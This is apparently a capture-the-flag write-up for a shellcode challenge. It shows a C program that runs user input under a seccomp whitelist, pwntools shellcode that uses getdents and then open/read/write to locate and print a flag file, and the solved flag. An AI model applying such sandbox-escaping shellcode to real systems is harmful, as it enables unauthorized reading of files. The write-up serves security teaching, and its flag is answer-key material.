# $hellc0de-0x3

## Write-up

- Source code :  

```c
#include <stdio.h>
#include <stdlib.h>
#include <seccomp.h>
#include <unistd.h>

#define CODE_SIZE 200

void disable_buffering(void);
void sandbox(void);

char code[CODE_SIZE] = { '\0' };

int main(int argc, char *argv[]) {
  disable_buffering();

  printf("Note: Flag filename is... You have to figure it out!\n");
  printf("Enter your shellcode : ");

  read(0, code, CODE_SIZE);

  sandbox();

  (*(void(*)()) code)();

  return EXIT_SUCCESS;
}

void disable_buffering(void) {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
}

void sandbox(void) {
  scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
  if (ctx == NULL) {
    fprintf(stderr, "seccomp error\n");
    exit(EXIT_FAILURE);
  }

  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getdents), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
  if (seccomp_load(ctx) < 0) {
    seccomp_release(ctx);
    exit(EXIT_FAILURE);
  }
  seccomp_release(ctx);
}
```

- A seccomp filter is used and in this case it's a whitelist filter, i.e: only a few syscalls are allowed : `open`, `read`, `write`, `getdents`, `exit` and `exit_group`
- Since we don't know what the flag filename is, we need to use `getdents` syscall to get entries in current directory :  
  - `open(".", O_DIRECTORY)` : open current directory, file descriptor is returned in `RAX` register
  - `getdents(RAX, rwbuf, 0x80)` : read directory entries into a controlled read/write buffer address (rwbuf) of size 0x80 bytes
  - `write(1, rwbuf, 0x80)` : print 0x80 bytes of rwbuf to stdout
- We can then decode the printed output with pwntools' helper function `dirents` :  

```python
# R/W address
RWBUF = 0x601800
COUNT = 0x80

shellcode = asm(
    shellcraft.open(".", constants.O_DIRECTORY) +
    shellcraft.getdents('rax', RWBUF, COUNT) +
    shellcraft.write(1, RWBUF, COUNT)
)

io.send(shellcode)
buf = io.recv(COUNT)
entries = dirents(buf)
log.info(f"entries: {entries}")
```

- After that we conclude the flag filename is `flag-44da17c5.txt`, we can now use again the combination of `open`, `read` and `write` to read the flag, like this :  
  - `open("flag-44da17c5.txt", 0)` : open flag file, file descriptor is returned in `RAX` register
  - `read(RAX, rwbuf, 0x100)` : read 0x100 bytes from open file descriptor to a controlled read/write buffer address (rwbuf)
  - `write(1, rwbuf, 0x100)` : print 0x100 bytes from rwbuf to stdout
- We can use the `shellcraft` module from `pwntools` to generate the shellcode :  

```python
# R/W address
RWBUF = 0x601800
READSIZE = 0x100
shellcode = asm(
    shellcraft.open("flag-44da17c5.txt", 0) +
    shellcraft.read("rax", RWBUF, READSIZE) +
    shellcraft.write(1, RWBUF, READSIZE)
)
```

- Full automated exploit with pwntools [here](solve.py)

## Flag

`shellmates{Ze_MaSt3r_0f_secc0MP_f1lterZzZ}`
